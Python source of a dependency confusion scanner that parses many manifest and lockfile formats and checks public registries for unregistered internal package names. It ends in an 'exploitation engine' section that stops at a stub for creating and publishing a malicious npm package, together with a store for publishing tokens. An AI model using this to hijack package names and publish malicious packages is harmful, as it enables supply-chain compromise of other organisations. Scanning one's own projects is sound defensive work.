#!/usr/bin/env python3
"""
DepCheck - Universal Dependency Confusion Scanner v3.0

Scans ALL dependency file formats, auto-detects type, checks each
package against public registries for dependency confusion vulnerabilities.

Supported: package.json, package-lock.json, yarn.lock, pnpm-lock.yaml,
requirements.txt, Pipfile, Pipfile.lock, pyproject.toml, composer.json,
composer.lock, Gemfile, Gemfile.lock, pom.xml, build.gradle, go.mod,
Cargo.toml, Cargo.lock, packages.config, .csproj

Zero dependencies — Python 3.6+ standard library only.
"""

import json
import re
import sys
import os
import platform
import argparse
import xml.etree.ElementTree as ET
from time import sleep, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError
from tempfile import NamedTemporaryFile, mkdtemp
import subprocess
import shutil

VERSION = "4.0"

CONFIG_DIR = os.path.expanduser("~/.depcheck")
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")

# ─── Colors ──────────────────────────────────────────────────────────

def _supports_color():
    if os.environ.get("NO_COLOR"):
        return False
    if platform.system() == "Windows":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            return True
        except Exception:
            return "WT_SESSION" in os.environ
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()


_COLOR = _supports_color()


class C:
    R = "\033[91m" if _COLOR else ""
    G = "\033[92m" if _COLOR else ""
    Y = "\033[93m" if _COLOR else ""
    B = "\033[94m" if _COLOR else ""
    CN = "\033[96m" if _COLOR else ""
    BD = "\033[1m" if _COLOR else ""
    X = "\033[0m" if _COLOR else ""


BANNER = f"""{C.R}
  ____             ____ _               _
 |  _ \\  ___ _ __ / ___| |__   ___  ___| | __
 | | | |/ _ \\ '_ \\ |   | '_ \\ / _ \\/ __| |/ /
 | |_| |  __/ |_) | |___| | | |  __/ (__|   <
 |____/ \\___| .__/ \\____|_| |_|\\___|\\___|_|\\_\\
            |_|
{C.Y} Universal Dependency Confusion Scanner v{VERSION}{C.X}
"""

# ─── Registries ──────────────────────────────────────────────────────

REGISTRIES = {
    "npm": "https://registry.npmjs.org/{}",
    "pip": "https://pypi.org/pypi/{}/json",
    "composer": "https://repo.packagist.org/p2/{}.json",
    "rubygems": "https://rubygems.org/api/v1/gems/{}.json",
    "nuget": "https://api.nuget.org/v3-flatcontainer/{}/index.json",
    "cargo": "https://crates.io/api/v1/crates/{}",
    "go": "https://proxy.golang.org/{}/@latest",
    "maven": "https://search.maven.org/solrsearch/select?q=a:{}%20AND%20g:{}&rows=1&wt=json",
}

DETECT_READ_LIMIT = 10240

# ─── File map ────────────────────────────────────────────────────────

FILE_MAP = {
    "package.json": "package_json",
    "package-lock.json": "package_lock_json",
    "npm-shrinkwrap.json": "package_lock_json",
    "yarn.lock": "yarn_lock",
    "pnpm-lock.yaml": "pnpm_lock",
    "requirements.txt": "requirements_txt",
    "pipfile": "pipfile",
    "pipfile.lock": "pipfile_lock",
    "pyproject.toml": "pyproject_toml",
    "composer.json": "composer_json",
    "composer.lock": "composer_lock",
    "gemfile": "gemfile",
    "gemfile.lock": "gemfile_lock",
    "pom.xml": "pom_xml",
    "build.gradle": "build_gradle",
    "build.gradle.kts": "build_gradle",
    "go.mod": "go_mod",
    "go.sum": "go_mod",
    "cargo.toml": "cargo_toml",
    "cargo.lock": "cargo_lock",
    "packages.config": "nuget_packages_config",
}


# ═════════════════════════════════════════════════════════════════════
# FILE TYPE DETECTION
# ═════════════════════════════════════════════════════════════════════

def detect_file_type(filepath):
    basename = os.path.basename(filepath).lower()

    # Exact match
    if basename in FILE_MAP:
        return FILE_MAP[basename]

    # Dotfiles: .package.json → package.json
    if basename.startswith("."):
        stripped = basename[1:]
        if stripped in FILE_MAP:
            return FILE_MAP[stripped]
        if stripped.endswith(".csproj"):
            return "csproj"

    # .csproj
    if basename.endswith(".csproj"):
        return "csproj"

    # Content-based detection
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read(DETECT_READ_LIMIT)

        if not content.strip():
            return "unknown"

        # JSON
        if content.strip().startswith("{"):
            if '"lockfileVersion"' in content:
                return "package_lock_json"
            if '"resolved"' in content and '"integrity"' in content:
                return "package_lock_json"
            if '"_meta"' in content and '"pipfile-spec"' in content:
                return "pipfile_lock"

            try:
                with open(filepath, "r", encoding="utf-8") as f2:
                    data = json.load(f2)
            except (json.JSONDecodeError, UnicodeDecodeError):
                data = None

            if isinstance(data, dict):
                if data.get("requires") is True and "dependencies" in data:
                    return "package_lock_json"
                deps = data.get("dependencies", {})
                if isinstance(deps, dict) and deps:
                    first_val = next(iter(deps.values()), None)
                    if isinstance(first_val, dict):
                        return "package_lock_json"
                    if isinstance(first_val, str):
                        return "package_json"
                if "require" in data or "require-dev" in data:
                    return "composer_json"
                pkgs = data.get("packages")
                if isinstance(pkgs, list) and pkgs and isinstance(pkgs[0], dict) and "name" in pkgs[0]:
                    return "composer_lock"
                if "default" in data and "develop" in data:
                    return "pipfile_lock"
                if "devDependencies" in data or "peerDependencies" in data or "name" in data:
                    return "package_json"

        # Text
        else:
            if "# THIS IS AN AUTOGENERATED FILE" in content and "yarn" in content.lower():
                return "yarn_lock"
            if re.search(r'^"?@?[\w/.-]+@[^:]+:\s*$', content, re.MULTILINE) and "version " in content:
                return "yarn_lock"
            if re.search(r'^\s*module\s+\S+', content, re.MULTILINE) and re.search(r'^\s*go\s+\d', content, re.MULTILINE):
                return "go_mod"
            if "<project" in content and ("<dependencies>" in content or "<dependency>" in content):
                return "pom_xml"
            if re.search(r'^\s*<PackageReference\s', content, re.MULTILINE):
                return "csproj"
            if re.search(r'(implementation|compile|api|testImplementation)\s*[\(\'"]', content):
                return "build_gradle"
            if re.search(r'^\[packages\]', content, re.MULTILINE):
                return "pipfile"
            if re.search(r'^\[package\]', content, re.MULTILINE) and re.search(r'^\[dependencies\]', content, re.MULTILINE):
                return "cargo_toml"
            if re.search(r'^\[\[package\]\]', content, re.MULTILINE) and 'name = "' in content:
                return "cargo_lock"
            if re.search(r'^gem\s+[\'"]', content, re.MULTILINE):
                return "gemfile"
            if "specs:" in content and re.search(r'^\s{4}\S+\s+\(', content, re.MULTILINE):
                return "gemfile_lock"
            if re.search(r'^[a-zA-Z0-9_][\w.-]*\s*[=<>!~]=', content, re.MULTILINE):
                return "requirements_txt"
            if "lockfileVersion" in content:
                return "pnpm_lock"

    except Exception:
        pass

    return "unknown"


def find_dep_files(directory):
    """Find all dependency files in a directory."""
    found = []
    targets = set(FILE_MAP.keys()) | {".csproj"}

    for root, dirs, files in os.walk(directory):
        # Skip common non-project dirs
        dirs[:] = [d for d in dirs if d not in ("node_modules", ".git", "__pycache__", "vendor", ".venv", "venv")]
        for fname in files:
            if fname.lower() in targets or fname.endswith(".csproj"):
                found.append(os.path.join(root, fname))

    return sorted(found)


# ═════════════════════════════════════════════════════════════════════
# PARSERS
# ═════════════════════════════════════════════════════════════════════

def _resolve_npm_alias(version_str):
    """Resolve npm alias: 'npm:real-package@^1.0.0' → ('real-package', '^1.0.0')"""
    real = version_str[4:]
    if real.startswith("@"):
        idx = real.index("@", 1) if "@" in real[1:] else len(real)
    else:
        idx = real.index("@") if "@" in real else len(real)
    name = real[:idx]
    ver = real[idx + 1:] if idx < len(real) else "*"
    return name, ver


def parse_package_json(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        data = json.load(f)

    packages = {}
    for section in ("dependencies", "devDependencies", "peerDependencies", "optionalDependencies"):
        if section in data and isinstance(data[section], dict):
            for name, version in data[section].items():
                if isinstance(version, str):
                    if version.startswith("npm:"):
                        name, version = _resolve_npm_alias(version)
                    elif re.match(r'^(git\+|https?://|file:|github:)', version):
                        continue
                    packages[name] = version
                elif isinstance(version, dict):
                    if any(k in version for k in ("git", "url", "path", "file")):
                        continue
                    packages[name] = version.get("version", "*")

    bundled = data.get("bundledDependencies") or data.get("bundleDependencies")
    if isinstance(bundled, list):
        for name in bundled:
            if isinstance(name, str) and name not in packages:
                packages[name] = "*"

    return packages, "npm"


def parse_package_lock_json(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        data = json.load(f)

    packages = {}

    # v2/v3: "packages" field
    if "packages" in data and isinstance(data["packages"], dict):
        for path, info in data["packages"].items():
            if path == "" or not isinstance(info, dict):
                continue
            if info.get("link") is True:
                continue
            resolved = info.get("resolved", "")
            if isinstance(resolved, str) and re.match(r'^(file:|git\+|git://)', resolved):
                continue
            # Use "name" field for aliases (e.g. fastify-static-deprecated → fastify-static)
            if "name" in info and isinstance(info["name"], str):
                name = info["name"]
            else:
                name = path.split("node_modules/")[-1] if "node_modules/" in path else path
            if name and not name.startswith("."):
                packages[name] = info.get("version", "0.0.0")

    # v1 fallback
    if not packages and "dependencies" in data:
        def _extract(deps):
            if not isinstance(deps, dict):
                return
            for name, info in deps.items():
                if isinstance(info, dict):
                    resolved = info.get("resolved", "")
                    if isinstance(resolved, str) and re.match(r'^(file:|git\+|git://)', resolved):
                        continue
                    from_field = info.get("from", "")
                    if isinstance(from_field, str) and "npm:" in from_field:
                        m = re.search(r'npm:(@?[^@]+)', from_field)
                        if m:
                            name = m.group(1)
                    packages[name] = info.get("version", "0.0.0")
                    if "dependencies" in info:
                        _extract(info["dependencies"])
                elif isinstance(info, str):
                    packages[name] = info
        _extract(data["dependencies"])

    return packages, "npm"


def parse_yarn_lock(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}

    # v1: "pkg@version:" + version "x.y.z"
    v1 = r'^"?(@?[^@\s"][^@"]*?)@(?:npm:)?[^:]+:\s*$\n\s+version\s+"?([^"\n]+)"?'
    for m in re.finditer(v1, content, re.MULTILINE):
        name = m.group(1).strip('"')
        if name:
            packages[name] = m.group(2).strip()

    # v2/berry fallback
    if not packages:
        current = None
        for line in content.split("\n"):
            m = re.match(r'^"?(@?[^@\s"][^@"]*?)@[^"]*"?:\s*$', line)
            if m:
                current = m.group(1).strip('"')
            elif current:
                vm = re.match(r'\s+version:?\s+"?([^"\n]+)', line)
                if vm:
                    packages[current] = vm.group(1).strip('"')
                    current = None

    return packages, "npm"


def parse_pnpm_lock(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}

    # v9+: 'package@version':  or  package@version:
    for m in re.finditer(r"^'?(@?[^@'\s]+)@(\d[^':\s]*)'?:", content, re.MULTILINE):
        packages[m.group(1)] = m.group(2)

    # v6: /package/version:
    if not packages:
        for m in re.finditer(r"^\s*/(@?[^/]+(?:/[^/]+)?)/(\d[^:]*?):", content, re.MULTILINE):
            packages[m.group(1)] = m.group(2)

    return packages, "npm"


def parse_requirements_txt(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        lines = f.readlines()

    packages = {}
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("-"):
            continue
        if re.match(r'^(git\+|https?://|file://|ssh://)', line):
            continue
        line = line.split("#")[0].split(";")[0].strip()
        if re.search(r'\s+@\s+(https?://|git\+|file://)', line):
            continue
        m = re.match(r'^([a-zA-Z0-9][\w.-]*)', line)
        if m:
            name = m.group(1)
            vm = re.search(r'[=<>!~]+\s*(.+)', line)
            packages[name] = vm.group(1).strip() if vm else "*"

    return packages, "pip"


def parse_pipfile(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}
    in_pkgs = False

    for line in content.split("\n"):
        s = line.strip()
        if s in ("[packages]", "[dev-packages]"):
            in_pkgs = True
            continue
        if s.startswith("[") and in_pkgs:
            in_pkgs = False
            continue
        if in_pkgs and "=" in s and not s.startswith("#"):
            name = s.split("=")[0].strip()
            value = s.split("=", 1)[1].strip()
            if re.search(r'\{\s*(git|path|url|file)\s*=', value):
                continue
            if name:
                packages[name] = value.strip('"').strip("'")

    return packages, "pip"


def parse_pipfile_lock(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        data = json.load(f)

    packages = {}
    for section in ("default", "develop"):
        if section in data and isinstance(data[section], dict):
            for name, info in data[section].items():
                if isinstance(info, dict):
                    if any(k in info for k in ("git", "path", "file", "directory")):
                        continue
                    packages[name] = info.get("version", "*").lstrip("=")
                else:
                    packages[name] = "*"

    return packages, "pip"


def parse_pyproject_toml(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}

    # Poetry
    in_deps = False
    for line in content.split("\n"):
        s = line.strip()
        if re.match(r'\[tool\.poetry\.(dev-)?dependencies\]', s) or \
           re.match(r'\[tool\.poetry\.group\.\w+\.dependencies\]', s):
            in_deps = True
            continue
        if s.startswith("[") and in_deps:
            in_deps = False
            continue
        if in_deps and "=" in s and not s.startswith("#"):
            name = s.split("=")[0].strip()
            if name and name != "python":
                if re.search(r'\b(git|path|url)\s*=', s):
                    continue
                vm = re.search(r'"([^"]*)"', s)
                packages[name] = vm.group(1) if vm else "*"

    # PEP 621
    pep = re.search(r'^\s*dependencies\s*=\s*\[(.*?)\]', content, re.MULTILINE | re.DOTALL)
    if pep:
        for dm in re.finditer(r'"([^"]+)"', pep.group(1)):
            dep = dm.group(1).strip()
            nm = re.match(r'^([a-zA-Z0-9][\w.-]*)', dep)
            if nm and nm.group(1) != "python":
                packages[nm.group(1)] = dep[len(nm.group(1)):] or "*"

    # optional-dependencies
    for om in re.finditer(r'^\[project\.optional-dependencies\.\w+\]\s*$\n(.*?)(?=^\[|\Z)', content, re.MULTILINE | re.DOTALL):
        for dm in re.finditer(r'"([^"]+)"', om.group(1)):
            nm = re.match(r'^([a-zA-Z0-9][\w.-]*)', dm.group(1).strip())
            if nm:
                packages[nm.group(1)] = "*"

    return packages, "pip"


def parse_composer_json(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        data = json.load(f)

    # Identify local repo packages
    local_repos = set()
    for repo in data.get("repositories", []):
        if isinstance(repo, dict) and repo.get("type") in ("path", "vcs", "git"):
            pkg = repo.get("package", {})
            if isinstance(pkg, dict) and "name" in pkg:
                local_repos.add(pkg["name"])

    packages = {}
    for section in ("require", "require-dev"):
        if section in data and isinstance(data[section], dict):
            for name, version in data[section].items():
                # Skip PHP platform reqs: php, ext-*, lib-*, composer-plugin-api
                if name in ("php", "composer-plugin-api") or name.startswith("ext-") or name.startswith("lib-"):
                    continue
                if name in local_repos:
                    continue
                packages[name] = version

    return packages, "composer"


def parse_composer_lock(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        data = json.load(f)

    packages = {}
    for section in ("packages", "packages-dev"):
        if section in data and isinstance(data[section], list):
            for pkg in data[section]:
                name = pkg.get("name", "")
                if not name:
                    continue
                source = pkg.get("source", {})
                if isinstance(source, dict) and source.get("type") == "path":
                    continue
                packages[name] = pkg.get("version", "*")

    return packages, "composer"


def parse_gemfile(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}
    for line in content.split("\n"):
        s = line.strip()
        if s.startswith("#"):
            continue
        if re.search(r'\b(path|git)\s*:', s):
            continue
        m = re.match(r"gem\s+['\"]([^'\"]+)['\"](?:\s*,\s*['\"]([^'\"]*)['\"])?", s)
        if m:
            packages[m.group(1)] = m.group(2) or "*"

    return packages, "rubygems"


def parse_gemfile_lock(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}
    in_gem = False
    in_specs = False

    for line in content.split("\n"):
        s = line.strip()
        if s in ("GEM", "GIT", "PATH", "PLUGIN SOURCE"):
            in_gem = (s == "GEM")
            in_specs = False
            continue
        if s == "specs:":
            in_specs = True
            continue
        if in_gem and in_specs:
            m = re.match(r'\s{4}(\S+)\s+\(([^)]+)\)', line)
            if m:
                packages[m.group(1)] = m.group(2)
            elif not line.startswith(" ") and s:
                in_specs = False
                in_gem = False

    return packages, "rubygems"


def parse_pom_xml(filepath):
    try:
        tree = ET.parse(filepath)
        root = tree.getroot()
    except ET.ParseError:
        return {}, "maven"

    ns = re.match(r'\{(.+?)\}', root.tag)
    p = f"{{{ns.group(1)}}}" if ns else ""

    packages = {}
    for dep in root.iter(f"{p}dependency"):
        g = dep.find(f"{p}groupId")
        a = dep.find(f"{p}artifactId")
        v = dep.find(f"{p}version")
        if g is not None and a is not None and g.text and a.text:
            packages[f"{g.text}:{a.text}"] = v.text if v is not None else "*"

    return packages, "maven"


def parse_build_gradle(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}
    pat = r"""(?:implementation|compile|api|runtimeOnly|testImplementation|compileOnly|testCompileOnly|annotationProcessor)\s*[\(]?\s*['"]([^'"]+):([^'"]+):([^'"]*?)['"]"""
    for m in re.finditer(pat, content):
        packages[f"{m.group(1)}:{m.group(2)}"] = m.group(3)

    return packages, "maven"


def parse_go_mod(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}
    replaced = set()
    in_require = False
    in_replace = False

    for line in content.split("\n"):
        s = line.strip()

        if re.match(r'^require\s*\(', s):
            in_require, in_replace = True, False
            continue
        if re.match(r'^replace\s*\(', s):
            in_replace, in_require = True, False
            continue
        if s == ")":
            in_require = in_replace = False
            continue

        # Collect replace → local path targets
        if in_replace or re.match(r'^replace\s+\S', s):
            rep = re.sub(r'^replace\s+', '', s) if not in_replace else s
            rep = re.sub(r'\s*//.*$', '', rep).strip()
            parts = rep.split("=>")
            if len(parts) == 2:
                right = parts[1].strip().split()
                if right and not re.match(r'^[a-zA-Z0-9]+\.[a-zA-Z]', right[0]):
                    replaced.add(parts[0].strip().split()[0])
            continue

        target = None
        if in_require:
            target = s
        elif re.match(r'^require\s+\S', s):
            target = re.sub(r'^require\s+', '', s)

        if target:
            target = re.sub(r'\s*//.*$', '', target).strip()
            parts = target.split()
            if len(parts) >= 2 and not parts[0].startswith("//"):
                packages[parts[0]] = parts[1]

    for mod in replaced:
        packages.pop(mod, None)

    return packages, "go"


def parse_cargo_toml(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}
    in_deps = False

    for line in content.split("\n"):
        s = line.strip()
        if re.match(r'^\[(.*dependencies.*)\]$', s):
            in_deps = True
            continue
        if s.startswith("[") and in_deps:
            in_deps = False
            continue
        if in_deps and "=" in s and not s.startswith("#"):
            if re.search(r'\b(path|git)\s*=', s):
                continue
            name = s.split("=")[0].strip()
            vm = re.search(r'"([^"]*)"', s)
            if name:
                packages[name] = vm.group(1) if vm else "*"

    return packages, "cargo"


def parse_cargo_lock(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    packages = {}
    for block in re.split(r'^\[\[package\]\]', content, flags=re.MULTILINE):
        nm = re.search(r'^name\s*=\s*"([^"]+)"', block, re.MULTILINE)
        vm = re.search(r'^version\s*=\s*"([^"]+)"', block, re.MULTILINE)
        sm = re.search(r'^source\s*=\s*"([^"]+)"', block, re.MULTILINE)
        if not nm or not vm:
            continue
        if not sm or not sm.group(1).startswith("registry+"):
            continue
        packages[nm.group(1)] = vm.group(1)

    return packages, "cargo"


def parse_nuget_packages_config(filepath):
    try:
        tree = ET.parse(filepath)
        root = tree.getroot()
    except ET.ParseError:
        return {}, "nuget"

    packages = {}
    for pkg in root.findall("package"):
        name = pkg.get("id", "")
        if name:
            packages[name] = pkg.get("version", "*")

    return packages, "nuget"


def parse_csproj(filepath):
    try:
        tree = ET.parse(filepath)
        root = tree.getroot()
    except ET.ParseError:
        return {}, "nuget"

    packages = {}
    for tag in ("PackageReference", "{http://schemas.microsoft.com/developer/msbuild/2003}PackageReference"):
        for ref in root.iter(tag):
            name = ref.get("Include", "")
            if name:
                packages[name] = ref.get("Version", "*")

    return packages, "nuget"


# ─── Parser Router ───────────────────────────────────────────────────

PARSERS = {
    "package_json": parse_package_json,
    "package_lock_json": parse_package_lock_json,
    "yarn_lock": parse_yarn_lock,
    "pnpm_lock": parse_pnpm_lock,
    "requirements_txt": parse_requirements_txt,
    "pipfile": parse_pipfile,
    "pipfile_lock": parse_pipfile_lock,
    "pyproject_toml": parse_pyproject_toml,
    "composer_json": parse_composer_json,
    "composer_lock": parse_composer_lock,
    "gemfile": parse_gemfile,
    "gemfile_lock": parse_gemfile_lock,
    "pom_xml": parse_pom_xml,
    "build_gradle": parse_build_gradle,
    "go_mod": parse_go_mod,
    "cargo_toml": parse_cargo_toml,
    "cargo_lock": parse_cargo_lock,
    "nuget_packages_config": parse_nuget_packages_config,
    "csproj": parse_csproj,
}


# ═════════════════════════════════════════════════════════════════════
# REGISTRY CHECKER
# ═════════════════════════════════════════════════════════════════════

def check_package(name, ecosystem, timeout=10, retries=3):
    for attempt in range(retries):
        try:
            if ecosystem == "npm":
                url = REGISTRIES["npm"].format(name.replace("/", "%2f"))
            elif ecosystem == "pip":
                url = REGISTRIES["pip"].format(name)
            elif ecosystem == "composer":
                url = REGISTRIES["composer"].format(name)
            elif ecosystem == "rubygems":
                url = REGISTRIES["rubygems"].format(name)
            elif ecosystem == "nuget":
                url = REGISTRIES["nuget"].format(name.lower())
            elif ecosystem == "cargo":
                url = REGISTRIES["cargo"].format(name)
            elif ecosystem == "go":
                url = REGISTRIES["go"].format(name)
            elif ecosystem == "maven":
                parts = name.split(":")
                if len(parts) != 2:
                    return (name, True, 200)
                url = REGISTRIES["maven"].format(parts[1], parts[0])
            else:
                return (name, True, 200)

            req = Request(url, headers={"User-Agent": f"DepCheck/{VERSION}"})
            resp = urlopen(req, timeout=timeout)

            if ecosystem == "maven":
                data = json.loads(resp.read())
                if data.get("response", {}).get("numFound", 0) == 0:
                    return (name, False, 404)

            return (name, True, resp.getcode())

        except HTTPError as e:
            if e.code == 404:
                return (name, False, 404)
            if e.code == 429:
                sleep(2 * (attempt + 1))
                continue
            return (name, True, e.code)
        except (URLError, OSError):
            if attempt < retries - 1:
                sleep(1 * (attempt + 1))
                continue
            return (name, None, 0)

    return (name, None, 0)


def scan_packages(packages, ecosystem, threads=20, timeout=10, quiet=False):
    results = {"vulnerable": [], "safe": [], "errors": []}
    total = len(packages)

    if not quiet:
        print(f"\n{C.CN}[*] Checking {total} packages against {ecosystem} registry...{C.X}\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(check_package, name, ecosystem, timeout): name
            for name in packages
        }

        done = 0
        try:
            for future in as_completed(futures):
                done += 1
                name, exists, status = future.result()
                pct = int(done * 100 / total)

                if not quiet:
                    bar = f"{'█' * (pct // 5)}{'░' * (20 - pct // 5)}"
                    sys.stdout.write(f"\r  {C.B}[{bar}] {pct}% ({done}/{total}){C.X} ")
                    sys.stdout.flush()

                if exists is None:
                    results["errors"].append((name, "network error"))
                elif exists:
                    results["safe"].append(name)
                else:
                    results["vulnerable"].append(name)
                    if not quiet:
                        sys.stdout.write(f"\r  {C.R}[!] {name} — NOT FOUND on {ecosystem}{C.X}{' ' * 40}\n")
        except KeyboardInterrupt:
            for f in futures:
                f.cancel()
            executor.shutdown(wait=False, cancel_futures=True)
            if not quiet:
                print(f"\n\n{C.Y}  [!] Interrupted (checked {done}/{total}){C.X}")
            raise

    if not quiet:
        sys.stdout.write(f"\r{' ' * 70}\r")
        sys.stdout.flush()

    return results


# ═════════════════════════════════════════════════════════════════════
# OUTPUT
# ═════════════════════════════════════════════════════════════════════

def print_results(results, packages, ecosystem, filepath, duration=0, quiet=False):
    vulnerable = sorted(results["vulnerable"])
    safe = results["safe"]
    errors = results["errors"]

    if quiet:
        for name in vulnerable:
            print(f"{name} @ {packages.get(name, '?')}")
        return len(vulnerable) > 0

    print(f"\n{'=' * 60}")
    print(f"{C.BD}  SCAN RESULTS{C.X}")
    print(f"{'=' * 60}")
    print(f"  File:       {filepath}")
    print(f"  Ecosystem:  {ecosystem}")
    print(f"  Total:      {len(packages)}")
    print(f"  Safe:       {C.G}{len(safe)}{C.X}")
    print(f"  Vulnerable: {C.R}{len(vulnerable)}{C.X}")
    if errors:
        print(f"  Errors:     {C.Y}{len(errors)}{C.X}")
    if duration > 0:
        print(f"  Duration:   {duration:.1f}s")
    print(f"{'=' * 60}")

    if vulnerable:
        # Separate scoped vs unscoped for npm
        if ecosystem == "npm":
            scoped = [n for n in vulnerable if n.startswith("@")]
            unscoped = [n for n in vulnerable if not n.startswith("@")]
        else:
            scoped = []
            unscoped = vulnerable

        print(f"\n{C.R}{C.BD}  [!] VULNERABLE — Not found on public registry:{C.X}\n")
        for name in vulnerable:
            marker = f" {C.Y}(scoped — lower risk){C.X}" if name.startswith("@") and ecosystem == "npm" else ""
            print(f"  {C.R}[!]{C.X} {name} @ {packages.get(name, '?')}{marker}")

        if unscoped:
            print(f"\n{C.Y}  An attacker can register these on the public {ecosystem} registry")
            print(f"  with a higher version → Remote Code Execution!{C.X}")
        if scoped:
            print(f"\n{C.CN}  Note: {len(scoped)} scoped (@org/) packages found. These require npm org")
            print(f"  ownership to exploit — lower risk but still worth investigating.{C.X}")

        verify = {
            "npm": "curl -s https://registry.npmjs.org/{} | head -1",
            "pip": "curl -s https://pypi.org/pypi/{}/json | head -1",
            "rubygems": "curl -s https://rubygems.org/api/v1/gems/{}.json | head -1",
            "composer": "curl -s https://repo.packagist.org/p2/{}.json | head -1",
            "cargo": "curl -s https://crates.io/api/v1/crates/{} | head -1",
        }
        tmpl = verify.get(ecosystem)
        if tmpl and vulnerable:
            print(f"\n{C.CN}  Verify:{C.X}")
            for name in vulnerable[:3]:
                print(f"    {tmpl.format(name)}")
    else:
        print(f"\n{C.G}  [OK] All {len(safe)} packages exist on the public {ecosystem} registry.")
        print(f"  No dependency confusion vulnerability found.{C.X}")

    if errors:
        print(f"\n{C.Y}  [?] Network errors ({len(errors)}):{C.X}")
        for name, err in errors[:10]:
            print(f"      {name}: {err}")
        if len(errors) > 10:
            print(f"      ... and {len(errors) - 10} more")

    print()
    return len(vulnerable) > 0


def export_results(results, packages, ecosystem, filepath, output_path):
    from datetime import datetime, timezone
    export = {
        "scan": {
            "file": filepath,
            "ecosystem": ecosystem,
            "total_packages": len(packages),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "tool": f"DepCheck v{VERSION}",
        },
        "vulnerable": [{"name": n, "version": packages.get(n, "?")} for n in sorted(results["vulnerable"])],
        "safe_count": len(results["safe"]),
        "error_count": len(results["errors"]),
        "errors": [{"name": n, "error": e} for n, e in results["errors"]],
    }
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(export, f, indent=2)
    print(f"{C.G}  [+] Exported: {output_path}{C.X}\n")


def convert_to_package_json(packages, output_path):
    out = {
        "name": "converted-by-depcheck",
        "version": "1.0.0",
        "dependencies": {k: (v if isinstance(v, str) else "*") for k, v in packages.items()}
    }
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(out, f, indent=2)
    print(f"{C.G}  [+] Converted: {output_path}{C.X}")
    print(f"  {C.CN}Run: confused -l npm {output_path}{C.X}\n")


def fetch_url(url, quiet=False):
    url_path = url.rstrip("/").split("/")[-1].split("?")[0]
    suffix = f".{url_path}" if "." in url_path else ".json"

    tmp = NamedTemporaryFile(delete=False, suffix=suffix, prefix="depcheck_")
    try:
        if not quiet:
            print(f"  {C.CN}[*] Fetching: {url}{C.X}")
        req = Request(url, headers={"User-Agent": f"DepCheck/{VERSION}"})
        resp = urlopen(req, timeout=30)
        data = resp.read()
        tmp.write(data)
        tmp.close()
        if not quiet:
            print(f"  {C.G}[+] Downloaded: {len(data):,} bytes{C.X}")
        return tmp.name, url_path
    except KeyboardInterrupt:
        tmp.close()
        os.unlink(tmp.name)
        raise
    except Exception as e:
        tmp.close()
        os.unlink(tmp.name)
        print(f"{C.R}  [ERROR] Failed to fetch: {e}{C.X}")
        sys.exit(1)


# ═════════════════════════════════════════════════════════════════════
# CREDENTIAL MANAGEMENT
# ═════════════════════════════════════════════════════════════════════

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {}


def save_config(cfg):
    os.makedirs(CONFIG_DIR, mode=0o700, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)
    os.chmod(CONFIG_FILE, 0o600)


def set_cred(key, value):
    cfg = load_config()
    cfg[key] = value
    save_config(cfg)
    print(f"{C.G}  [+] Saved {key} to {CONFIG_FILE}{C.X}")


def delete_cred(key):
    cfg = load_config()
    if key in cfg:
        del cfg[key]
        save_config(cfg)
        print(f"{C.G}  [+] Deleted {key}{C.X}")
    else:
        print(f"  {C.Y}Key '{key}' not found.{C.X}")


def get_cred(key, cli_value=None):
    """Get credential: CLI arg > config file > None."""
    if cli_value:
        return cli_value
    return load_config().get(key)


def show_config():
    cfg = load_config()
    if not cfg:
        print(f"  {C.Y}No saved credentials. Use --save-creds to save.{C.X}")
        return
    print(f"\n{C.BD}  Saved credentials ({CONFIG_FILE}):{C.X}\n")
    for k, v in cfg.items():
        masked = v[:8] + "..." + v[-4:] if len(v) > 16 else v[:4] + "..."
        print(f"  {C.CN}{k}:{C.X} {masked}")
    print()


# ═════════════════════════════════════════════════════════════════════
# EXPLOITATION ENGINE
# ═════════════════════════════════════════════════════════════════════

def _escape_js(s):
    """Escape string for safe embedding in JavaScript single-quoted strings."""
    return s.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"').replace("\n", "\\n").replace("\r", "\\r").replace("`", "\\`").replace("$", "\\$")


def _escape_py(s):
    """Escape string for safe embedding in Python double-quoted strings."""
    return s.replace("\\", "\\\\").replace('"', '\\"').replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r")


def _dns_label(s):
    """Sanitize string for use as a DNS label (alphanumeric + hyphens, max 60 chars)."""
    return re.sub(r'[^a-zA-Z0-9-]', '-', s)[:60].strip('-')


def _exploit_npm(pkg_name, callback, token, author="security-research"):
    """Create and publish malicious npm package."""
